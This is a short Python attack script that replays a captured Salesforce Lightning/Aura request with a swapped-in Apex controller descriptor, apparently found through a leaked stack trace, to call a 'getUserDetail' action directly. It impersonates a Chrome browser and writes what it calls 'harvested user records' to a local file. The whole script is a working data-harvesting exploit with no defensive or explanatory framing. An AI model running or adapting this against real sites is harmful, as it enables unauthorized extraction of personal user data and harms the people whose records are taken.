import json
from curl_cffi import requests
import urllib.parse

print("[*] Loading captured request structure...")
with open("captured_feed_request.json", "r") as f:
    base_req = json.load(f)

url = base_req["url"]
headers = base_req["headers"]
original_post_data = base_req["post_data"]

parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

# The Holy Grail Controller discovered from the stack trace
target_descriptor = "apex://OLC_BreadcrumbController/ACTION$getUserDetail"

message_obj = {
    "actions": [
        {
            "id": "800;a",
            "descriptor": target_descriptor,
            "callingDescriptor": "markup://c:OLC_R_Header",
            "params": {}
        }
    ]
}

parsed_data["message"] = json.dumps(message_obj)
new_post_data = urllib.parse.urlencode(parsed_data)

session = requests.Session()
print(f"[*] Dispatching direct user detail harvest request to {target_descriptor}...")

res = session.post(url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=15)
print(f"[+] Status Code: {res.status_code} | Length: {len(res.text)}")
print(f"[+] Response Output:\n{res.text[:3500]}")

with open("final_user_records.json", "w") as out:
    out.write(res.text)

print("[+] Saved harvested user records to final_user_records.json")

